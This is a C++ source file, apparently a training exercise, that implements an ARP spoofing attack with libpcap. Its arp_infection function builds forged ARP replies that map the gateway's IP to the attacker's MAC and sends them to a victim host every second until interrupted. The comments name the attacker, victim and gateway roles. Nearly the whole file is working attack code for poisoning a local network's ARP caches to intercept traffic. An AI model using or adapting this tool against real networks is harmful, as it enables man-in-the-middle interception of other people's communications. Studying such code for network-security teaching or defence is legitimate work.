#include <cstdio>
#include <cstring>
#include <pcap.h>
#include <arpa/inet.h>//ip -> bin
#include <netinet/in.h>
#include <sys/utsname.h>
#include <netdb.h>
#include <iostream>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <thread>
#include <signal.h>
#include <unistd.h>

#define PCAP_OPENFLAG_PROMISCUOUS   1   // Even if it isn't my mac, receive packet

using namespace std;
namespace
{
    volatile sig_atomic_t quit;
    void signal_handler(int sig)
        {
            signal(sig, signal_handler);
            quit = 1;
        }
}
#pragma pack(push,1)
struct _ether_hdr{
    uint8_t Dst_mac[6];
    uint8_t Src_mac[6];
    uint16_t ether_type;
};
struct _arp_hdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;  //mac len
  uint8_t plen;  //ip len
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint32_t sender_ip;
  uint8_t target_mac[6];
  uint32_t target_ip;
};
struct my_hdr {
    struct _ether_hdr eh;
    struct _arp_hdr ah;
};
#pragma pack(pop)
void mac_changer(const char *ipm,uint8_t *opm) //ipm = inputmac, opm = outputmac
{
    sscanf(ipm,"%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",&opm[0],&opm[1],&opm[2],&opm[3],&opm[4],&opm[5]);    //%x cause an error, fix to %2hhx
}

void arp_request(char *snd_ip,char *snd_mac,char *trg_ip,pcap_t *fp)
{
    struct my_hdr mh;
    struct _ether_hdr *eh = &mh.eh;
    struct _arp_hdr *ah = &mh.ah;
    inet_pton(AF_INET,snd_ip,&ah->sender_ip);
    mac_changer(snd_mac,eh->Src_mac);
    inet_pton(AF_INET,trg_ip,&ah->target_ip);
    memset(eh->Dst_mac,0xFF,sizeof(eh->Dst_mac));
    memcpy(ah->sender_mac,eh->Src_mac,6);
    memset(ah->target_mac,0x00,sizeof(ah->target_mac));
    eh->ether_type = ntohs(0x0806);
    ah->htype = ntohs(0x0001);
    ah->ptype = ntohs(0x0800);
    ah->hlen = 0x06;
    ah->plen = 0x04;
    ah->opcode = ntohs(0x0001);
    if(pcap_sendpacket(fp,(const u_char*)&mh,42) != 0)
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
    }
}
void arp_infection(char *snd_ip,char *snd_mac,char *trg_ip, char *trg_mac,pcap_t *fp)
{
    cout<<"Send arp reply..."<<endl;
    struct my_hdr mh;
    struct _ether_hdr *eh = &mh.eh;
    struct _arp_hdr *ah = &mh.ah;
    inet_pton(AF_INET,snd_ip,&ah->sender_ip);
    mac_changer(snd_mac,eh->Src_mac);
    inet_pton(AF_INET,trg_ip,&ah->target_ip);
    mac_changer(trg_mac,eh->Dst_mac);
    memcpy(ah->sender_mac,eh->Src_mac,6);
    memcpy(ah->target_mac,eh->Dst_mac,6);
    eh->ether_type = ntohs(0x0806);
    ah->htype = ntohs(0x0001);
    ah->ptype = ntohs(0x0800);
    ah->hlen = 0x06;
    ah->plen = 0x04;
    ah->opcode = ntohs(0x0002);
    while(!quit)
    {
        if(pcap_sendpacket(fp,(const u_char*)&mh,42) != 0)
        {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
        }
        sleep(1);
    }
}
/*
void get_addr(pcap_t *fp,char *rcv_ip)
{
    struct bpf_program fcode;
    struct ether_header *eh;
    struct ip *ip_h;
//    struct pcap_pkthdr *;

    cout<<"Getting reciever's mac addr..."<<endl;
    if(pcap_compile(fp,&fcode,IP_HDR_FILLTER,1,NULL) < 0)
    {
        cout<<"pcap_compile_error"<<endl;
    }
    if(pcap_setfilter(fp,&fcode)<0)
    {
        cout<<"pcap_set_filter_error"<<endl;
    }
}
*/
int main(int argc,char *argv[])
{
    if(argc != 6)
    {
        printf("not enough argument!\n");
        printf("EX : DEVICE SENDER_IP SENDER_MAC TARGET_IP TARGET_MAC\n");
        return 1;
    }
/*  attacker= atk_ip,atk_mac    (attacker)
    sender	= snd_ip,snd_mac    (victim)
    receiver= rcv_ip,rcv_mac    (gateway)*/

    char *dev = argv[1];    //get device name
    char *atk_ip = "192.168.205.129";   //arp_request test
    char *atk_mac = argv[3];//get attacker mac addr
    char *snd_ip = argv[4]; //get victim ip addr
    char *snd_mac = argv[5];//get victim mac addr
    char *rcv_ip = argv[2]; //get gateway ip addr
    char *rcv_mac;

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t *fp;
    struct bpf_program fcode;

    if((fp= pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS , 1, errbuf)) == NULL)
    {
        fprintf(stderr,"Unable to open the adapter. %s is not supported by Pcap\n", dev);
    }
//    get_addr(fp,rcv_ip);
    signal(SIGINT,signal_handler);
    thread(arp_infection,rcv_ip,atk_mac,snd_ip,snd_mac,fp).join();  //send arp_infection to victim periodically
   //arp_request(atk_ip,atk_mac,rcv_ip,fp);    //send who has rcv_ip?
}
